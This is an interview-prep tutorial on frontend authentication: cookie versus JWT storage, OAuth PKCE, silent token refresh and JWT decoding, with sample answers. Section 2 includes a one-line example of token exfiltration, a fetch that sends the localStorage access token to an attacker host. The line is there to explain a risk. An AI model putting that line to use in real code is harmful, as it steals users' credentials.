# Authentication, OAuth, and JWT from the Frontend

Every frontend interview eventually asks "where do you store the token" and "walk me through the login redirect." Answering well means knowing what the browser actually does at each step, not just naming the flow.

## 1. Session Cookies vs. JWT, from the Browser's Point of View

A session-cookie app and a JWT app look almost identical in the browser network tab, but the client's responsibilities differ.

With a **session cookie**, the login response sets a cookie (`Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax`). The frontend never touches the value. Every `fetch`/`axios` call just needs `credentials: 'include'` (or same-origin defaults) and the browser attaches the cookie automatically. Logout is a server call that invalidates the session record; the frontend has nothing to clean up.

With a **JWT**, the server hands the frontend an actual string, and the frontend becomes responsible for storing it, attaching it to every request, refreshing it before it expires, and deleting it on logout. That extra responsibility is exactly where most frontend security bugs live.

```javascript
// Session-cookie app: the frontend does almost nothing
async function getProfile() {
  const res = await fetch('/api/profile', { credentials: 'include' });
  if (res.status === 401) redirectToLogin();
  return res.json();
}

// JWT app: the frontend owns attaching and refreshing the token
async function getProfile(accessToken) {
  const res = await fetch('/api/profile', {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  if (res.status === 401) {
    const newToken = await refreshAccessToken();
    return getProfile(newToken);
  }
  return res.json();
}
```

Interviewers care about this distinction because it changes where CSRF and XSS risk live, which is the next section.

## 2. Where to Store a JWT: httpOnly Cookie vs. localStorage

This is the single most common frontend security question, and the honest answer is "it's a trade-off between two different attacks," not "cookies are always right."

**`localStorage` (or `sessionStorage`, or a JS variable/Redux store):**
- Any JavaScript running on the page can read it — your own code, a third-party script tag, or a compromised npm dependency.
- If the app has an XSS vulnerability anywhere (a rendered comment, a `dangerouslySetInnerHTML`, a vulnerable dependency), the attacker's script can read `localStorage.getItem('token')` and exfiltrate it to their own server. Game over — they now have a valid, portable token.
- It is immune to CSRF, because CSRF relies on the browser *automatically* attaching credentials; a script must explicitly read `localStorage` and attach the header itself.

**httpOnly cookie:**
- `document.cookie` cannot read it — `HttpOnly` blocks JavaScript access entirely, so a garden-variety XSS payload cannot steal the token directly (it could still ride the cookie to make an authenticated request from the victim's own browser, but it can't exfiltrate the raw token for reuse elsewhere).
- The browser attaches it automatically to every matching request, which reintroduces **CSRF**: a malicious site can trigger a `POST` to your API and the browser will happily attach the cookie. Mitigate with `SameSite=Lax`/`Strict` and a CSRF token on state-changing requests.
- Requires the cookie's domain to be the same site (or a properly configured `SameSite=None; Secure` cross-site setup), which is why this pattern usually pairs with a Backend-for-Frontend (BFF) that sits on your own domain in front of a separate auth/resource server.

```javascript
// What a compromised dependency can do if the token lives in localStorage
fetch('https://attacker.example/collect', {
  method: 'POST',
  body: localStorage.getItem('accessToken'), // silently exfiltrated
});

// What the same dependency CANNOT do if the token is an httpOnly cookie
document.cookie; // does not include the auth cookie at all
```

The practical guidance that holds up in interviews: **prefer an httpOnly, `Secure`, `SameSite=Lax` cookie issued by a same-origin BFF**, add CSRF-token protection on top, and reserve raw JWT-in-`localStorage` for cases where there is no BFF and the app already has strong XSS discipline (strict CSP, no unsanitized HTML, locked-down dependency list). Neither option is "safe by default" — you're choosing which failure mode you're better equipped to prevent.

## 3. OAuth 2.0 Authorization Code Flow with PKCE — the "Login with Google" Button

OAuth2 is a delegation protocol: it lets your SPA get access to a resource without ever seeing the user's Google/GitHub/Okta password. From the frontend, "Login with Google" is a redirect dance with one background POST at the end.

Actors: **Resource Owner** (the user), **Client** (your React app — a "public client" because it can't keep a secret), **Authorization Server** (Google/Auth0/Okta), **Resource Server** (your API).

Because the app runs entirely in the browser, it cannot hold a `client_secret` safely (anyone can open devtools and read your bundle). **PKCE** replaces the static secret with a one-time cryptographic proof generated fresh for each login attempt.

Step-by-step, as the frontend experiences it:

1. **Button click.** The app generates a random `code_verifier`, derives `code_challenge = base64url(sha256(code_verifier))`, and stashes the verifier in `sessionStorage` alongside a random `state` (CSRF guard for the redirect) and, for OIDC, a `nonce`.
2. **Redirect to the Authorization Server.** `window.location.href` is set to Google's `/authorize` endpoint with `client_id`, `redirect_uri`, `response_type=code`, `scope`, `state`, `code_challenge`, and `code_challenge_method=S256`. The React app unloads completely; it is not running while the user logs in on Google's domain.
3. **User authenticates and consents** on Google's own UI. Your app has no visibility into this step, which is exactly the point — it never sees the password.
4. **Callback.** Google redirects the browser back to your registered `redirect_uri` (e.g. `https://app.example.com/auth/callback?code=abc123&state=xyz`). Your callback route re-mounts, reads `code` and `state` from the URL, and **rejects the response if `state` doesn't match** what was stashed in step 1 (this is what stops an attacker from injecting their own authorization code).
5. **Token exchange.** The frontend makes a background `POST` to the token endpoint with the `code` and the original plain-text `code_verifier` (not the hash). The Authorization Server recomputes `sha256(code_verifier)`, compares it to the `code_challenge` it stored in step 2, and only issues tokens if they match — proving the app exchanging the code is the same instance that started the flow.
6. **Tokens land.** The server returns an `access_token` (for calling APIs), often an `id_token` (OIDC, for rendering "Welcome, Priya" in the UI), and a `refresh_token`. The app stores them per the trade-off in section 2, clears the query string from the URL (`history.replaceState`), and routes the user into the app.

```javascript
// Step 1: kick off the flow
async function loginWithGoogle() {
  const codeVerifier = generateRandomString(64);
  const codeChallenge = base64UrlEncode(await sha256(codeVerifier));
  const state = generateRandomString(32);

  sessionStorage.setItem('pkce_verifier', codeVerifier);
  sessionStorage.setItem('oauth_state', state);

  const params = new URLSearchParams({
    client_id: GOOGLE_CLIENT_ID,
    redirect_uri: 'https://app.example.com/auth/callback',
    response_type: 'code',
    scope: 'openid profile email',
    state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
  });
  window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;
}

// Step 4-6: the /auth/callback route
async function handleOAuthCallback() {
  const url = new URL(window.location.href);
  const code = url.searchParams.get('code');
  const returnedState = url.searchParams.get('state');

  if (returnedState !== sessionStorage.getItem('oauth_state')) {
    throw new Error('State mismatch — possible CSRF, aborting login');
  }

  const res = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'https://app.example.com/auth/callback',
      client_id: GOOGLE_CLIENT_ID,
      code_verifier: sessionStorage.getItem('pkce_verifier'),
    }),
  });
  const { access_token, id_token, refresh_token } = await res.json();
  sessionStorage.removeItem('pkce_verifier');
  sessionStorage.removeItem('oauth_state');
  storeTokensSecurely({ access_token, id_token, refresh_token });
  window.history.replaceState({}, '', '/dashboard');
}
```

In practice, libraries like `oauth4webapi`, `oidc-client-ts`, or a framework's built-in auth handler (NextAuth/Auth.js, Auth0 SDK) implement all of this for you — but interviewers want to hear that you understand what those libraries are doing, not just that you called `useAuth()`.

## 4. Silent Token Refresh

Access tokens are deliberately short-lived (5-15 minutes), so the frontend needs a way to get a new one without interrupting the user or forcing a full re-login.

**Refresh-token-in-httpOnly-cookie pattern (recommended for SPAs):** the refresh token itself is never exposed to JavaScript. The frontend calls a `/refresh` endpoint with no body — the browser attaches the httpOnly refresh cookie automatically — and gets back a new short-lived access token (kept in memory, not storage). This avoids ever putting a long-lived, high-value credential where a script could read it.

**Silent iframe / `prompt=none` pattern (classic OIDC):** the app loads a hidden `<iframe>` pointed at the Authorization Server's `/authorize` endpoint with `prompt=none`. If the user still has a live session cookie with the IdP, the IdP responds instantly with a fresh code inside the iframe with no visible redirect. This has been getting harder to rely on because Safari's ITP and Chrome's third-party-cookie phase-out block the IdP's session cookie inside a third-party iframe.

The pattern every frontend needs regardless of which refresh mechanism is used is a **single-flight refresh queue**, so that five simultaneous 401s don't trigger five parallel refresh calls (which can race and invalidate each other if refresh tokens rotate on use):

```javascript
let refreshPromise = null;

async function refreshAccessToken() {
  if (!refreshPromise) {
    refreshPromise = fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })
      .then((res) => {
        if (!res.ok) throw new Error('Refresh failed — force re-login');
        return res.json();
      })
      .then(({ access_token }) => {
        inMemoryAccessToken = access_token;
        return access_token;
      })
      .finally(() => { refreshPromise = null; });
  }
  return refreshPromise;
}

// Axios-style interceptor using the queue
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retried) {
      error.config._retried = true;
      const token = await refreshAccessToken();
      error.config.headers.Authorization = `Bearer ${token}`;
      return api(error.config);
    }
    return Promise.reject(error);
  }
);
```

If the refresh call itself fails (refresh token expired, revoked, or reused after rotation), the frontend should treat that as a hard logout: clear in-memory state and redirect to `/login`, not retry silently forever.

## 5. JWT Structure and Why the Frontend Should Never "Trust" Its Claims

A JWT is three Base64URL segments joined by dots: `header.payload.signature`. A frontend engineer needs to be able to read one, but should never make an authorization decision based on what it reads.

- **Header** — metadata: `{ "alg": "RS256", "typ": "JWT" }`. Tells you the signing algorithm, nothing else.
- **Payload** — the claims: `{ "sub": "user_123", "email": "a@b.com", "roles": ["admin"], "exp": 1755878400, "iat": 1755874800 }`. This is **only encoded, not encrypted** — anyone with the string can decode it with `atob()` or jwt.io and read every field.
- **Signature** — `HMACSHA256(base64(header) + "." + base64(payload), secret)` (or an RSA/EC signature for `RS256`/`ES256`). This is what the *server* checks. The frontend has no secret key and generally **cannot and should not verify the signature** — it has no way to know if the token was tampered with.

```javascript
// Frontend "decoding" a JWT — this is NOT verification
function decodeJwtPayload(token) {
  const [, payloadB64] = token.split('.');
  const json = atob(payloadB64.replace(/-/g, '+').replace(/_/g, '/'));
  return JSON.parse(json);
}

const claims = decodeJwtPayload(accessToken);
// { sub: "user_123", roles: ["admin"], exp: 1755878400, ... }
```

It is completely reasonable to decode a JWT on the frontend for **UX purposes**: showing the user's name, deciding when to proactively refresh (`exp` is 30 seconds away), or picking which nav items to *render* for a smoother experience. It is **not** reasonable to treat a decoded `roles: ["admin"]` claim as proof the user is an admin for anything that matters, because:

1. **The frontend can't verify the signature**, so it has no cryptographic basis for trusting the payload came from the real Authorization Server unmodified.
2. **Even a genuinely valid token's claims can be stale** — a user demoted from admin five minutes ago may still be walking around with a token that says `roles: ["admin"]` until it expires.
3. **Client-side gating is a UX affordance, not a security boundary.** Hiding the "Delete Account" button because the decoded claim lacks `admin` stops nothing — an attacker can trivially call the DELETE endpoint directly with devtools or curl. The **resource server** must re-check signature, issuer, audience, expiry, and authorization on every request; that's a backend concern, not a frontend one.

```javascript
// Fine: cosmetic, non-security use of a decoded claim
function Header() {
  const { name, picture } = decodeJwtPayload(accessToken);
  return <Avatar name={name} src={picture} />;
}

// Wrong: using a claim as an actual access-control gate
if (decodeJwtPayload(accessToken).roles.includes('admin')) {
  await fetch('/api/users/42', { method: 'DELETE' }); // server MUST re-check this independently
}
```

## Interview Questions and Answers

### 1. Why is `localStorage` considered risky for storing a JWT?

**Answer:** Any JavaScript executing on the page — your own code, a third-party script, or a compromised npm dependency — can read `localStorage` directly. A single XSS vulnerability anywhere in the app lets an attacker exfiltrate the token wholesale and reuse it from their own machine, with no further interaction needed from the victim.

### 2. If httpOnly cookies stop token theft, why doesn't everyone just use them?

**Answer:** Because they trade one problem for another: an httpOnly cookie is immune to being read by JavaScript, but the browser attaches it automatically to matching requests, which reopens CSRF. You have to add `SameSite` settings and CSRF tokens on state-changing requests, and cross-site cookie delivery (e.g. app and API on different domains) gets complicated with `SameSite=None` requirements and browser third-party-cookie restrictions.

### 3. Walk me through what happens when a user clicks "Login with Google" in a React SPA.

**Answer:** The app generates a PKCE `code_verifier`/`code_challenge` pair and a random `state`, then redirects the full page to Google's authorize endpoint with the challenge and `state`. Google authenticates the user on its own domain and redirects back to the app's callback route with an authorization `code`; the app verifies `state` matches, then POSTs the code plus the original `code_verifier` to the token endpoint to receive the access, ID, and refresh tokens.

### 4. What problem does PKCE actually solve?

**Answer:** A public client like a browser SPA can't hold a `client_secret` safely because the bundle is fully inspectable. PKCE replaces the static secret with a one-time secret (`code_verifier`) generated per login attempt, so even if an attacker intercepts the authorization code in the redirect, they can't exchange it for tokens without also having the verifier that only the legitimate app instance holds.

### 5. Why does the frontend check `state` on the OAuth callback?

**Answer:** `state` is a CSRF defense for the redirect itself — without it, an attacker could initiate their own OAuth flow, capture a valid authorization code, and trick the victim into completing the callback with the attacker's code, logging the victim into the attacker's account. The app generates a random `state`, stores it before redirecting, and rejects the callback if the returned `state` doesn't match.

### 6. Can the frontend trust the `roles` claim inside a JWT for showing/hiding an admin action?

**Answer:** It can use it to decide what to *render* for UX smoothness, but never as the actual security check, because the frontend has no way to verify the token's signature and the claim can be stale relative to a very recent permission change. The API endpoint behind that action must independently re-validate the token and re-check authorization server-side, since a hidden button is trivially bypassed with devtools or a raw HTTP call.

### 7. How do you avoid firing five refresh requests when five API calls 401 at once?

**Answer:** Use a single in-flight promise that all callers await: the first 401 kicks off the refresh call and stores the pending promise, and subsequent 401s that arrive before it resolves just await the same promise instead of starting a new request. This prevents duplicate refresh calls from racing each other, which matters especially when refresh tokens rotate on use and an earlier one would get invalidated by a later one.

### 8. What's the difference between an access token and an ID token in OIDC?

**Answer:** The access token is an opaque-to-the-client credential the frontend attaches to API calls so the resource server can authorize the request; the ID token is a JWT specifically meant for the client to read, containing profile claims like name and email so the frontend can render "who's logged in" state. Only the ID token is meant to be consumed by the frontend — the access token's format is a contract between the Authorization Server and Resource Server, not the client.

### 9. Is a JWT encrypted?

**Answer:** No, a standard JWT (JWS) is encoded and signed, not encrypted — the payload is plain Base64URL and anyone holding the string can decode it with `atob()` or a site like jwt.io. That's why sensitive data (passwords, SSNs, secrets) should never go in a JWT payload, even one delivered only server-to-server.

### 10. What's the frontend's role when a refresh token call fails?

**Answer:** Treat it as a hard logout, not a retry candidate: clear any in-memory access token, drop cached user state, and redirect to the login screen. A failed refresh usually means the refresh token expired, was revoked, or tripped reuse detection after rotation, and silently retrying would just mask a session that's genuinely gone.

## Revision Checklist

- [ ] Explain what the frontend does differently under session cookies vs. JWTs (nothing to store/attach vs. full lifecycle ownership).
- [ ] State the real trade-off between `localStorage` (XSS-exposed) and httpOnly cookies (CSRF-exposed), not just "cookies are safer."
- [ ] Narrate the Authorization Code + PKCE flow end to end: verifier/challenge generation, redirect, callback, `state` check, token exchange.
- [ ] Explain why PKCE replaces `client_secret` for public clients like SPAs.
- [ ] Describe a silent-refresh pattern and why a single-flight refresh queue matters.
- [ ] Decode a JWT's three parts (header/payload/signature) and know the payload is readable, not encrypted.
- [ ] Justify why decoded JWT claims are fine for UX but never for an actual authorization decision.
- [ ] Explain what happens on the frontend when a refresh call fails (hard logout, not silent retry).
